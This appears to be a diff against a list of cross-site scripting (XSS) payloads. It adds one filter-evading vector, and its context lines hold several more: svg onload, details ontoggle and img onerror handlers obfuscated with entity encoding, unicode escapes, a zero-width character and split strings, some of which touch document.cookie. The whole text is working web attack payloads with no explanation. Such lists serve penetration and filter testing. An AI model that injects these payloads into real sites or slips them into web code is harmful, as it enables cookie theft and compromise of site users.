@@ -44,3 +44,4 @@ svg onload=alert&#0000000040document.cookie)>
 <svg onload='new Function' ["Yeee!"].find(al\u0065rt)`'>
 <details x=xxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028; origin&#x000029;>
 "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+<details open ontoggle​=content['al'%2B'ert'](1) >
